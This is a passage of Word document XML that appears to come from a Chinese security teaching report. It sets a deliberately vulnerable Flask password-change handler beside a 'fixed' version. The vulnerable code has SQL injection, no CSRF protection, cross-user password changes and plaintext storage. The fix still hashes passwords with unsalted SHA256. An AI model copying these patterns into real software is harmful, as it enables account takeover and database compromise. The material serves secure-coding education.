        <w:t xml:space="preserve">    if not username or not new_password:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "缺少参数"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ 无CSRF Token / 无原密码 / 可越权 / 无Referer</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ SQL注入 + 明文存储</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sql = f"UPDATE users SET password = '{new_password}' WHERE username = '{username}'"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute(sql); conn.commit()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect("/profile")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E7D32"/>
        </w:rPr>
        <w:t>修复版本（app_fixed.py — 35行）：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t xml:space="preserve">    username = request.form.get("username", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    new_password = request.form.get("new_password", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ CSRF Token验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if token != session.get("csrf_token", ""):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "CSRF Token验证失败"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ Session绑定</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if username != session["username"]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "无权修改他人密码"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ Referer验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not referer.startswith(request.host_url):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "请求来源不合法"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ 参数化查询 + SHA256</w:t>
        <w:br/>
        <w:t xml:space="preserve">    hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute("UPDATE users SET password = ? WHERE username = ?",</w:t>
        <w:br/>
        <w:t xml:space="preserve">              (hashed_pw, username))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    conn.commit()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect("/profile")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